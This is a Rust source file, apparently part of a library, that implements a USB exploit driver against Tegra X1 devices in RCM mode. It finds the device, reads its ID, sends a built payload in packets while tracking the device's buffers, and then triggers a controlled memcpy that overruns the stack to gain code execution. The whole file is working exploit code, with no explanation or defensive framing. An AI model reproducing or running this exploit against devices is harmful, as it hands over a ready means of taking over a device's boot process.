use std::io::Read;
use std::iter::repeat;

mod constants;
mod exploit;
pub mod payload;

use constants::*;
pub use exploit::{ExploitBackend, LinuxBackend};

#[derive(Debug)]
pub enum ExploitError {
    PayloadError(payload::PayloadBuildError),
    UsbError(rusb::Error),
}

impl From<rusb::Error> for ExploitError {
    fn from(err: rusb::Error) -> Self {
        ExploitError::UsbError(err)
    }
}

impl From<payload::PayloadBuildError> for ExploitError {
    fn from(err: payload::PayloadBuildError) -> Self {
        ExploitError::PayloadError(err)
    }
}

pub struct ExploitDriver<B: ExploitBackend> {
    /// The exploit backend, providing OS-specific interactions.
    backend: B,

    /// Current buffer in use: either 0 or 1. The first write will be to the low buffer.
    current_buffer: usize,
}

impl<B: ExploitBackend> ExploitDriver<B> {
    /// Initialize the `ExploitDriver` by finding a USB device with the provided Vendor ID and
    /// Product ID, returning an error if the device cannot be located.
    pub fn discover(vid: u16, pid: u16) -> Result<Self, ()> {
        Ok(Self {
            backend: B::discover(vid, pid)?,
            current_buffer: 0,
        })
    }

    pub fn exploit<T: Read, I: Read>(
        &mut self,
        target: T,
        intermezzo: I,
    ) -> Result<(), ExploitError> {
        let payload_bytes = payload::build_payload(intermezzo, target)?;

        self.read_device_id().unwrap();
        self.write(payload_bytes.as_slice())?;
        self.switch_to_high_buffer()?;
        self.trigger_controlled_memcpy();
        Ok(())
    }

    /// Toggle the target buffer. This method should be called to match the operation happening
    /// in RCM on the X1 device.
    ///
    /// Toggles self.current_buffer between zero and one.
    fn toggle_buffer(&mut self) {
        self.current_buffer = 1 - self.current_buffer;
    }

    /// Return the memory address of the current buffer based on our internal tracking of the
    /// current buffer.
    fn current_buffer_address(&self) -> usize {
        COPY_BUFFER_ADDRESSES[self.current_buffer]
    }

    fn switch_to_high_buffer(&mut self) -> Result<(), rusb::Error> {
        match self.current_buffer {
            0 => {
                // Write 0x1000 null-bytes to force the buffer to switch.
                let buf: Vec<u8> = repeat(0).take(0x1000).collect();
                self.write(buf.as_slice())?;
            }
            1 => {} // Current buffer is the high buffer; do nothing.
            _ => unreachable!(),
        }
        Ok(())
    }

    fn trigger_controlled_memcpy(&self) {
        let length = STACK_END - self.current_buffer_address();
        self.backend
            .trigger_vulnerability(length)
            .expect("Failed to trigger vulnerability");
    }

    /// Perform a bulk read on the USB device, returning the number of bytes read.
    fn read(&self, buf: &mut [u8]) -> Result<usize, rusb::Error> {
        self.backend.read(buf)
    }

    /// The RCM protocol requires reading the device ID before a payload can be sent.
    fn read_device_id(&self) -> Result<(), rusb::Error> {
        let mut buf = [0u8; 16];
        self.read(&mut buf)?;

        Ok(())
    }

    /// Write bytes to the USB device, returning the number of bytes written.
    ///
    /// This method also tracks the internal USB buffer state on the Tegra device so the exploit
    /// can accurately switch between the high/low buffer later.
    fn write(&mut self, buf: &[u8]) -> Result<usize, rusb::Error> {
        const PACKET_SIZE: usize = 0x1000;

        let mut i = 0;
        while i < buf.len() {
            let write_slice = &buf[i..std::cmp::min(buf.len(), i + PACKET_SIZE)];
            self.backend
                .write(write_slice)?;
            self.toggle_buffer();
            i += PACKET_SIZE;
        }

        Ok(i)
    }
}
